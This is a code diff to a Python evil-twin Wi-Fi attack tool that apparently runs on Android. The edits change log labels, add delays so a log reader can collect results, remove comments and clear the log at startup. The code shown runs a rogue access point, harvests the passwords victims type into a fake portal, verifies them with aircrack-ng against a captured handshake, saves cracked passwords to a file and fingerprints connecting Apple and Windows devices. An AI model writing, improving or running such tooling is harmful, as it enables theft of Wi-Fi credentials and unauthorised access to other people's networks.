@@ -36,7 +36,7 @@ logger = logging.getLogger(__name__)
 def log_info(msg): logger.info(f"[*] {msg}")
 def log_warn(msg): logger.warning(f"[!] {msg}")
 def log_error(msg): logger.error(f"[-] {msg}")
-def log_success(msg): logger.info(f"[✓] {msg}")
+def log_success(msg): logger.info(f"[SUCCESS] {msg}")
 def log_debug(msg): logger.debug(f"[DEBUG] {msg}")
 
 @dataclass
@@ -78,6 +78,9 @@ class EvilTwinAttack:
     def cleanup_temp_files(self):
         log_info("Logs kept at /sdcard/evil_twin_debug.log for debugging")
         log_debug("Cleaning up temporary files...")
+        
+        # Wait 10 seconds for $12 to read final logs before deleting PID
+        time.sleep(10)
         
         # Delete PID file from /sdcard
         pid_file = Path("/sdcard/evil_twin.pid")
@@ -444,16 +447,20 @@ class EvilTwinAttack:
                     password = password.strip()
                     if password and password not in shown_connections:
                         shown_connections.add(password)
-                        # Send to both files
                         print(f"\n[!] New password attempt: {password}")
                         log_warn(f"New password attempt: {password}")
                         
                         if self.config.handshake_captured and Path(self.config.handshake_file).exists():
                             ret, stdout, _ = self.run_command(f"aircrack-ng {self.config.handshake_file} -b {self.config.target_bssid} -w password.txt 2>/dev/null | grep -q 'KEY FOUND'")
                             if ret == 0:
-                                # Send to both files
                                 print(f"\nPASSWORD CRACKED: {password}")
                                 log_success(f"PASSWORD CRACKED: {password}")
+                                
+                                # Flush logs and wait 10 seconds for $12 to read
+                                for handler in logger.handlers:
+                                    handler.flush()
+                                time.sleep(10)
+                                
                                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                 with open("cracked.txt", 'a') as f:
                                     f.write(f"{timestamp} | SSID: {self.config.target_ssid} | BSSID: {self.config.target_bssid} | Password: {password}\n")
@@ -473,7 +480,6 @@ class EvilTwinAttack:
                                 mac = mac_match.group()
                                 if mac not in connection_cache:
                                     connection_cache.add(mac)
-                                    # Send to both files
                                     print(f"[+] Device connected: {mac}")
                                     log_info(f"Device connected: {mac}")
                         elif "AP-STA-DISCONNECTED" in line:
@@ -482,9 +488,8 @@ class EvilTwinAttack:
                                 mac = mac_match.group()
                                 if mac in connection_cache:
                                     connection_cache.remove(mac)
-                                    # Send to both files
-                                    print(f"[-] Device disconnected: {mac}")
-                                    log_info(f"Device disconnected: {mac}")
+                                print(f"[-] Device disconnected: {mac}")
+                                log_info(f"Device disconnected: {mac}")
                     hostapd_pos = f.tell()
             
             if Path("/tmp/dnsmasq.log").exists():
@@ -499,11 +504,9 @@ class EvilTwinAttack:
                                 mac = stdout.strip()
                                 if mac:
                                     if "captive.apple.com" in line:
-                                        # Send to both files
                                         print(f"[DNS] Apple device detected: {mac}")
                                         log_info(f"Apple device detected: {mac}")
                                     elif "msftconnecttest.com" in line:
-                                        # Send to both files
                                         print(f"[DNS] Windows device detected: {mac}")
                                         log_info(f"Windows device detected: {mac}")
                     dnsmasq_pos = f.tell()
@@ -539,6 +542,10 @@ class EvilTwinAttack:
         log_success("Cleanup complete")
     
     def run(self):
+        # Clear old log file for fresh start
+        with open("/sdcard/evil_twin_debug.log", "w") as f:
+            f.truncate(0)
+        
         parser = argparse.ArgumentParser(description='Evil Twin Attack Tool')
         parser.add_argument('--interface', required=True, help='Monitor interface (already in monitor mode)')
         parser.add_argument('--bssid', required=True, help='Target BSSID')
